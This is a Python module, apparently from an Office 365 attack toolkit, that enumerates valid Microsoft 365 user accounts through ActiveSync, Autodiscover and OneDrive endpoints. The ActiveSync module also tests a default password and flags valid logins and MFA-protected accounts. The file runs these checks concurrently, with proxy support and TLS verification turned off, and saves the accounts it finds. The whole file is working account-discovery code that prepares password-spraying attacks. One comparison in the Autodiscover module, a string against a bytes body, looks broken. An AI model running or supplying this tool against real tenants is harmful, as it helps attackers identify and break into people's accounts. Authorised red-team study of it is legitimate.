#!/usr/bin/env python3

# Based on: https://bitbucket.org/grimhacker/office365userenum/
#           https://github.com/Raikia/UhOh365

import time
import urllib3
import asyncio
import requests
import concurrent.futures
import concurrent.futures.thread
from functools import partial
from requests.auth import HTTPBasicAuth
from core.utils.config import *
from core.utils.helper import *
from core.utils.colors import text_colors
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class Enumerator:
    """ Perform user enumeration using Microsoft Server ActiveSync """

    valid_accts  = []  # Valid account storage
    tested_accts = []  # Tested account storage
    helper = Helper()  # Helper functions

    def __init__(self, loop, args):
        self.loop       = loop
        self.args       = args
        self.proxies    = None if not self.args.proxy else {
            "http": self.args.proxy, "https": self.args.proxy
        }
        self.executor = concurrent.futures.ThreadPoolExecutor(
            max_workers=self.args.rate
        )

        # Enumeration Modules
        self._modules = {
            'autodiscover': self._autodiscover,
            'activesync':   self._activesync,
            'onedrive':     self._onedrive
        }


    def shutdown(self, key=False):
        # Print new line after ^C
        msg  = '\n\n[*] Writing valid accounts found to file \'%s/enum/valid_accts\'...' % self.args.output
        msg += '\n[*] Please see %s/enum/enumerated_accts.txt for all enumerated accounts.' % self.args.output
        if key:
            msg = '\n[!] CTRL-C caught.' + msg
        print(msg)

        # https://stackoverflow.com/a/48351410
        # https://gist.github.com/yeraydiazdiaz/b8c059c6dcfaf3255c65806de39175a7
        # Unregister _python_exit while using asyncio
        # Shutdown ThreadPoolExecutor and do not wait for current work
        import atexit
        atexit.unregister(concurrent.futures.thread._python_exit)
        self.executor.shutdown = lambda wait:None

        # Write the tested accounts
        self.helper.write_tested(self.tested_accts, "%s/enum/enumerated_accts.txt" % (self.args.output))

        # Write the valid accounts
        self.helper.write_data(self.valid_accts, "%s/enum/valid_accts.txt" % (self.args.output))


    """ Template for HTTP Request """
    def _send_request(self, request, url, auth=None, data=None, headers=Config.headers):
        return request(  # Send HTTP request
            url,
            auth=auth,
            data=data,
            headers=headers,
            proxies=self.proxies,
            timeout=self.args.timeout,
            allow_redirects=False,
            verify=False
        )


    """ Enumerate users on Microsoft using Microsoft Server ActiveSync """
    # https://bitbucket.org/grimhacker/office365userenum/
    def _activesync(self, user, password):
        try:
            # Add special header for ActiveSync
            headers = Config.headers  # Grab external headers from config.py
            headers["MS-ASProtocolVersion"] = "14.0"

            # Build email if not already built
            email = self.helper.check_email(user, self.args.domain)

            # Keep track of tested names in case we ctrl-c
            self.tested_accts.append(email)

            time.sleep(0.250)

            auth     = HTTPBasicAuth(email, password)
            url      = "https://outlook.office365.com/Microsoft-Server-ActiveSync"
            response = self._send_request(requests.options, url, auth=auth, headers=headers)

            status = response.status_code
            if status == 200:
                print("[%sVALID_LOGIN%s]\t\t%s%s" % (text_colors.green, text_colors.reset, email, self.helper.space))
                self.valid_accts.append(user)

            elif status == 401:
                print("[%sVALID_USER%s]\t\t%s%s" % (text_colors.green, text_colors.reset, email, self.helper.space))
                self.valid_accts.append(user)

            elif status == 403:
                print("[%sVALID_LOGIN_MFA%s]\t%s%s" % (text_colors.green, text_colors.reset, email, self.helper.space))
                self.valid_accts.append(user)

            elif status == 404 and ("X-CasErrorCode" in response.headers.keys() and response.headers['X-CasErrorCode'] == "UserNotFound"):
                print("[%sINVALID_USER%s]\t\t%s%s" % (text_colors.red, text_colors.reset, email, self.helper.space), end='\r')

            else:
                print("[%sUNKNOWN%s]\t\t%s%s" % (text_colors.yellow, text_colors.reset, email, self.helper.space), end='\r')

        except Exception as e:
            if self.args.debug: print("\n[ERROR]\t\t\t%s" % e)
            pass


    """ Enumerate users on Microsoft using Microsoft Autodiscover """
    # https://github.com/Raikia/UhOh365
    def _autodiscover(self, user, password):
        try:
            # Add special header for Autodiscover
            headers = Config.headers  # Grab external headers from config.py
            headers["User-Agent"] = "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.12026; Pro)"

            # Build email if not already built
            email = self.helper.check_email(user, self.args.domain)

            # Keep track of tested names in case we ctrl-c
            self.tested_accts.append(email)

            time.sleep(0.250)

            url      = "https://outlook.office365.com/autodiscover/autodiscover.json/v1.0/{EMAIL}?Protocol=Autodiscoverv1"
            response = self._send_request(requests.get, url.format(EMAIL=email), headers=headers)

            status = response.status_code
            body   = response.content
            # "X-MailboxGuid" in response.headers.keys()  # This appears to not be a required header for valid accounts
            if status == 200:
                print("[%sVALID_USER%s]\t\t%s%s" % (text_colors.green, text_colors.reset, email, self.helper.space))
                self.valid_accts.append(user)

            elif status == 302:
                if "outlook.office365.com" not in body:
                    print("[%sVALID_USER%s]\t\t%s%s" % (text_colors.green, text_colors.reset, email, self.helper.space))
                    self.valid_accts.append(user)

                else:
                    print("[%sINVALID_USER%s]\t\t%s%s" % (text_colors.red, text_colors.reset, email, self.helper.space), end='\r')

            else:
                print("[%sINVALID_USER%s]\t\t%s%s" % (text_colors.red, text_colors.reset, email, self.helper.space), end='\r')

        except Exception as e:
            if self.args.debug: print("\n[ERROR]\t\t\t%s" % e)
            pass


    """ Enumerate users on Microsoft using One Drive """
    # https://github.com/nyxgeek/onedrive_user_enum/blob/master/onedrive_enum.py
    # https://www.trustedsec.com/blog/achieving-passive-user-enumeration-with-onedrive/
    def _onedrive(self, user, password):
        try:
            # Remove email format from user if present
            user = user.split('@')[0]

            # Keep track of tested names in case we ctrl-c
            self.tested_accts.append(user)

            time.sleep(0.250)

            # Collect the pieces to build the One Drive URL
            domain_array = (self.args.domain.split('.'))

            domain = domain_array[0]        # Collect the domain
            tenant = domain                 # Use domain as tenant
            tld    = domain_array[-1]       # Grab the TLD
            user   = user.replace(".","_")  # Replace any `.` with `_` for use in the URL

            url = "https://{TENANT}-my.sharepoint.com/personal/{USERNAME}_{DOMAIN}_{TLD}/_layouts/15/onedrive.aspx".format(
                TENANT=tenant, USERNAME=user, DOMAIN=domain, TLD=tld
            )
            response = self._send_request(requests.head, url)

            status = response.status_code
            if status == 403:
                print("[%sVALID_USER%s]\t\t%s%s" % (text_colors.green, text_colors.reset, user, self.helper.space))
                self.valid_accts.append(user)

            elif status == 404:
                print("[%sINVALID_USER%s]\t\t%s%s" % (text_colors.red, text_colors.reset, user, self.helper.space), end='\r')

            else:
                print("[%sUNKNOWN%s]\t\t%s%s" % (text_colors.yellow, text_colors.reset, user, self.helper.space), end='\r')

        except Exception as e:
            if self.args.debug: print("\n[ERROR]\t\t\t%s" % e)
            pass


    """ Asyncronously Send HTTP Requests """
    async def run(self, userlist, password="Password1"):
        blocking_tasks = [
            self.loop.run_in_executor(self.executor, partial(self._modules[self.args.enum_type], user=user, password=password))
            for user in userlist
        ]
        if blocking_tasks:
            await asyncio.wait(blocking_tasks)
